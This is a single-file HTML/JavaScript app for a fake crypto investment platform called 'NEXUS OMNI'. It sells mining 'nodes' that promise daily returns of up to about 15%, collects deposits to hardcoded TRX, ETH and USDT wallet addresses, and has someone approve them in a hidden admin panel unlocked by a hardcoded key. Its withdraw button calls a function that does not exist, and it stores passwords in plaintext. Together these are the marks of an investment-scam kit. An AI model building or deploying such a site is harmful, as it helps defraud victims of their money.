<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS OMNI | Prime Banking</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
        :root { --nexus-blue: #2563eb; --nexus-gold: #f59e0b; --nexus-black: #020617; }
        body { background: #fcfcfd; color: #0f172a; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
        
        .glass { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(0,0,0,0.05); border-radius: 30px; }
        .btn-prime { background: var(--nexus-black); color: white; border-radius: 18px; font-weight: 800; padding: 20px; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); text-transform: uppercase; font-size: 11px; letter-spacing: 2px; }
        .btn-prime:active { transform: scale(0.95); opacity: 0.8; }
        .input-prime { background: #f4f7fa; border-radius: 18px; padding: 18px; width: 100%; border: 1px solid transparent; outline: none; transition: 0.3s; font-weight: 600; }
        .input-prime:focus { border-color: var(--nexus-blue); background: #fff; box-shadow: 0 0 0 5px rgba(37,99,235,0.1); }
        
        .nav-icon { color: #94a3b8; transition: 0.3s; cursor: pointer; display: flex; flex-direction: column; align-items: center; font-size: 10px; font-weight: 800; }
        .nav-icon.active { color: var(--nexus-blue); transform: translateY(-5px); }
        
        #preloader { position: fixed; inset: 0; background: #fff; z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .page-enter { animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="preloader"><div class="w-14 h-14 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div></div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-md w-full space-y-12">
            <div class="text-center">
                <h1 class="text-5xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1>
                <p class="text-[9px] font-black text-slate-400 uppercase tracking-[10px] mt-4">Future of Wealth Management</p>
            </div>

            <div id="login-box" class="glass p-10 space-y-6 shadow-2xl shadow-blue-900/5">
                <input type="text" id="l-user" placeholder="Account Key" class="input-prime">
                <input type="password" id="l-pass" placeholder="Security PIN" class="input-prime">
                <button onclick="handleLogin()" class="btn-prime w-full">Access Terminal</button>
                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">New Client? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Onboard Identity</span></p>
            </div>

            <div id="signup-box" class="glass p-10 space-y-6 hidden shadow-2xl shadow-blue-900/5">
                <input type="text" id="s-user" placeholder="Unique Account Name" class="input-prime">
                <input type="password" id="s-pass" placeholder="Create Security PIN" class="input-prime">
                <button onclick="handleSignup()" class="btn-prime w-full">Initialize Protocol</button>
                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">Existing? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Login Here</span></p>
            </div>
        </div>
    </div>

    <div id="main-view" class="hidden pb-40">
        <header class="p-6 sticky top-0 z-50 bg-white/70 backdrop-blur-3xl border-b border-slate-50 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="master-trigger" class="w-14 h-14 bg-black text-white rounded-3xl flex items-center justify-center text-2xl font-black italic shadow-xl">N</div>
                <div>
                    <p id="client-name" class="text-sm font-black text-slate-900 uppercase">---</p>
                    <p class="text-[9px] font-bold text-emerald-500 uppercase flex items-center gap-1"><span class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-ping"></span> Live Vault Link</p>
                </div>
            </div>
            <button onclick="logout()" class="w-12 h-12 rounded-2xl bg-slate-50 flex items-center justify-center text-slate-400"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="tab-home" class="p-6 space-y-8 page-enter">
            <div class="glass p-10 bg-gradient-to-br from-slate-900 to-black text-white border-none shadow-2xl relative overflow-hidden">
                <div class="relative z-10 space-y-10">
                    <div>
                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest opacity-60">Portfolio Liquid Value</p>
                        <h2 id="ui-bal" class="text-5xl font-black mt-3 tracking-tighter">$0.00</h2>
                    </div>
                    <div class="flex justify-between items-end">
                        <div>
                            <p class="text-[9px] font-black text-slate-500 uppercase tracking-widest">Compounded Yield</p>
                            <p id="ui-prof" class="text-3xl font-black text-emerald-400">+$0.00</p>
                        </div>
                        <button onclick="copyRef()" class="bg-blue-600 px-6 py-3 rounded-2xl text-[10px] font-black uppercase shadow-lg shadow-blue-600/30">Share Link</button>
                    </div>
                </div>
                <div class="absolute -right-16 -top-16 w-60 h-60 bg-blue-500/10 rounded-full blur-[80px]"></div>
            </div>

            <div class="glass p-5 flex gap-4 items-center">
                <div class="w-12 h-12 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center text-xl font-bold"><i class="fa-solid fa-bolt"></i></div>
                <input type="text" id="promo-input" placeholder="Enter Redemption Grant" class="bg-transparent border-none outline-none flex-1 font-bold text-xs uppercase">
                <button onclick="applyGrant()" class="text-blue-600 font-black text-[11px] uppercase tracking-tighter">Apply</button>
            </div>

            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[6px] ml-2">Operational Nodes</h3>
            <div id="active-nodes-container" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 space-y-6 hidden page-enter">
            <h3 class="text-sm font-black uppercase border-l-8 border-blue-600 pl-4">Elite Sovereignty (5)</h3>
            <div id="nodes-elite" class="grid gap-5"></div>
            <h3 class="text-sm font-black uppercase border-l-8 border-slate-200 pl-4 mt-12">Standard Protocols (12)</h3>
            <div id="nodes-standard" class="grid gap-4"></div>
        </main>

        <main id="tab-bank" class="p-6 space-y-8 hidden page-enter">
            <div class="glass p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Inbound Capital</h3>
                <select id="dep-method" class="input-prime font-black" onchange="renderDepUI()">
                    <option value="">Choose Asset Network</option>
                    <option value="TRX">TRX (Trust Wallet)</option>
                    <option value="ETH">ETH (Metamask)</option>
                    <option value="USDT">USDT (Binance TRC20)</option>
                </select>
                <div id="dep-display" class="hidden space-y-6 border-t pt-8">
                    <div class="bg-slate-50 p-6 rounded-3xl border border-slate-100 text-center">
                        <p class="text-[9px] font-black text-slate-300 uppercase mb-3">Copy Terminal Address</p>
                        <p id="addr-txt" class="text-[11px] font-mono font-black text-blue-600 break-all select-all"></p>
                    </div>
                    <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="input-prime">
                    <input type="text" id="dep-tid" placeholder="Transaction Hash ID" class="input-prime">
                    <div class="bg-white p-5 rounded-2xl border border-slate-50 flex justify-between items-center">
                        <span class="text-[10px] font-black text-slate-400 uppercase">Audit Screenshot</span>
                        <input type="file" id="dep-proof" class="text-[10px] font-bold w-1/2">
                    </div>
                    <button onclick="sendDeposit()" class="btn-prime w-full shadow-2xl shadow-blue-500/10">Authorize Deposit</button>
                </div>
            </div>

            <div class="glass p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Outbound Settlement</h3>
                <select id="with-gate" class="input-prime font-black">
                    <option value="">Payout Destination</option>
                    <option value="Binance">Binance Terminal</option><option value="Trust">Trust Wallet</option><option value="Metamask">Metamask</option>
                    <option value="OKX">OKX Terminal</option><option value="ByBit">ByBit Finance</option><option value="Coinbase">Coinbase Pro</option><option value="Wire">Direct Bank Swift</option>
                </select>
                <input type="number" id="with-amt" placeholder="Amount ($)" class="input-prime">
                <input type="text" id="with-addr" placeholder="Target Address Hash" class="input-prime">
                <button onclick="sendWithdraw()" class="btn-prime w-full !bg-slate-800">Finalize Payout</button>
            </div>
        </main>

        <main id="tab-ledger" class="p-6 space-y-4 hidden page-enter">
            <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Settlement Ledger</h3>
            <div id="history-box" class="space-y-4"></div>
        </main>

        <nav class="fixed bottom-10 left-8 right-8 h-24 glass shadow-2xl flex justify-around items-center px-6 z-[1000]">
            <div onclick="nav('home')" class="nav-icon active"><i class="fa-solid fa-layer-group text-2xl mb-1"></i>DASH</div>
            <div onclick="nav('nodes')" class="nav-icon"><i class="fa-solid fa-server text-2xl mb-1"></i>ASSETS</div>
            <div onclick="nav('bank')" class="nav-icon"><i class="fa-solid fa-shuffle text-2xl mb-1"></i>BANK</div>
            <div onclick="nav('ledger')" class="nav-icon"><i class="fa-solid fa-receipt text-2xl mb-1"></i>LEDGER</div>
        </nav>
    </div>

    <div id="admin-view" class="fixed inset-0 bg-white z-[10001] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 pb-6 border-b">
            <h2 class="text-lg font-black uppercase tracking-widest">Master Protocol Control</h2>
            <button onclick="document.getElementById('admin-view').classList.add('hidden')" class="text-6xl font-light">&times;</button>
        </div>
        <div id="admin-content" class="space-y-8"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        // 17 NODES INFRASTRUCTURE
        const catalog = {
            elite: [
                { id: 901, name: "Omni Sovereign", price: 3000, daily: 350, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" },
                { id: 902, name: "Omni Titan", price: 7500, daily: 900, img: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=400" },
                { id: 903, name: "Omni Prime", price: 12000, daily: 1600, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=400" },
                { id: 904, name: "Omni Elite Core", price: 18000, daily: 2500, img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?w=400" },
                { id: 905, name: "Omni Alpha Master", price: 25000, daily: 3800, img: "https://images.unsplash.com/photo-1620321023374-d1a68fbc720d?w=400" }
            ],
            standard: Array.from({length: 12}, (_, i) => ({
                id: i+1, name: `Capital Protocol v${i+1}`, price: 50 + (i*150), daily: 7 + (i*18), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400&sig=${i}`
            }))
        };

        window.onload = () => {
            renderNodes();
            setTimeout(() => document.getElementById('preloader').style.display='none', 1000);
            const user = localStorage.getItem('nx_user');
            if(user) startSession(user);
        };

        function renderNodes() {
            const nodeUI = (n) => `
                <div class="glass overflow-hidden flex items-center h-32 border-none shadow-xl shadow-slate-100">
                    <img src="${n.img}" class="w-32 h-32 object-cover">
                    <div class="px-8 flex-1">
                        <h4 class="text-xs font-black uppercase tracking-tight">${n.name}</h4>
                        <p class="text-[10px] font-black text-emerald-600 mt-1">Settlement: $${n.daily}/day</p>
                        <div class="flex justify-between items-center mt-4">
                            <span class="text-lg font-black text-slate-900">$${n.price}</span>
                            <button onclick="buyNode(${n.id})" class="bg-black text-white text-[9px] font-black px-6 py-2.5 rounded-2xl">DEPLOY</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('nodes-elite').innerHTML = catalog.elite.map(nodeUI).join('');
            document.getElementById('nodes-standard').innerHTML = catalog.standard.map(nodeUI).join('');
        }

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('client-name').innerText = uid;
            
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-container').innerHTML = active.map(([k, v]) => `
                    <div class="glass p-6 flex justify-between items-center border-l-8 border-blue-600">
                        <div><p class="text-[11px] font-black uppercase">${v.name}</p><p class="text-[9px] text-slate-300 font-bold mt-1">Mining Active</p></div>
                        <span class="text-xs font-mono font-black bg-slate-100 px-5 py-2.5 rounded-2xl timer" data-end="${v.nextClaim}">00:00:00</span>
                    </div>`).join('') || '<div class="text-center py-20 text-[10px] font-black text-slate-300 uppercase tracking-[5px]">All Protocols Offline</div>';

                const history = d.history ? Object.entries(d.history).reverse() : [];
                document.getElementById('history-box').innerHTML = history.map(([k, h]) => `
                    <div class="glass p-6 flex justify-between items-center border-none shadow-sm">
                        <div><p class="text-[11px] font-black uppercase">${h.type}</p><p class="text-[9px] text-slate-400 font-bold mt-1">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black text-slate-900">$${h.amount}</p><span class="status-badge text-[9px] font-black uppercase ${h.status === 'Cleared' ? 'text-emerald-500' : 'text-amber-500'}">${h.status}</span></div>
                    </div>`).join('');
            });
        }

        window.applyGrant = async () => {
            const code = document.getElementById('promo-input').value.trim();
            const codes = { "NX100": 100, "ELITE99": 500, "SWEETIE": 1000 };
            if(codes[code]) {
                const uid = localStorage.getItem('nx_user');
                const s = await get(ref(db, `users/${uid}`));
                await update(ref(db, `users/${uid}`), { balance: (s.val().balance || 0) + codes[code] });
                alert("Institutional Grant Authorized!");
            } else alert("Invalid Hash.");
        };

        window.sendDeposit = () => {
            const f = document.getElementById('dep-proof').files[0];
            if(!f) return alert("Proof Required.");
            const reader = new FileReader();
            reader.readAsDataURL(f);
            reader.onload = async () => {
                const uid = localStorage.getItem('nx_user'), key = push(ref(db, 'admin/requests')).key;
                const req = { id: key, user: uid, amount: document.getElementById('dep-amt').value, tid: document.getElementById('dep-tid').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() };
                await set(ref(db, `admin/requests/${key}`), req);
                await set(ref(db, `users/${uid}/history/${key}`), req);
                alert("Audit Initiated.");
                nav('ledger');
            };
        };

        // UNLIMITED ADMIN TRIGGER (4 Taps)
        let taps = 0; document.getElementById('master-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Nexus Protocol Key:") === "coin786") { document.getElementById('admin-view').classList.remove('hidden'); runAdmin(); } taps = 0; }
        };

        function runAdmin() {
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('admin-content').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass p-8 space-y-6 shadow-2xl">
                        <div class="flex justify-between font-black text-xs uppercase"><span>${r.type} | Client: ${r.user}</span><span>$${r.amount}</span></div>
                        <img src="${r.proof}" class="w-full h-64 object-cover rounded-3xl border">
                        <div class="flex gap-4">
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared')" class="btn-prime !bg-emerald-600 flex-1">Authorize</button>
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined')" class="btn-prime !bg-rose-600 flex-1">Reject</button>
                        </div>
                    </div>`).join('') : '<p class="text-center font-black text-slate-300">System Idle: No Pending Audits</p>';
            });
        }

        window.audit = async (id, user, amt, status) => {
            if(status === 'Cleared') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            await update(ref(db, `users/${user}/history/${id}`), { status });
            await remove(ref(db, 'admin/requests/' + id));
        };

        window.renderDepUI = () => {
            const m = document.getElementById('dep-method').value;
            const map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "ETH": "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" };
            document.getElementById('addr-txt').innerText = map[m] || "";
            document.getElementById('dep-display').classList.toggle('hidden', !m);
        };

        window.nav = (p) => { ['home','nodes','bank','ledger'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-icon').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value; const s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nx_user', u); startSession(u); } else alert("Access Denied."); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value; if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); toggleAuth(false); } };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.copyRef = () => { navigator.clipboard.writeText(window.location.href + "?ref=" + localStorage.getItem('nx_user')); alert("Protocol Hash Copied."); };

        setInterval(() => {
            document.querySelectorAll('.timer').forEach(el => {
                const diff = parseInt(el.dataset.end) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                } else el.innerText = "Processing...";
            });
        }, 1000);
    </script>
</body>
</html>
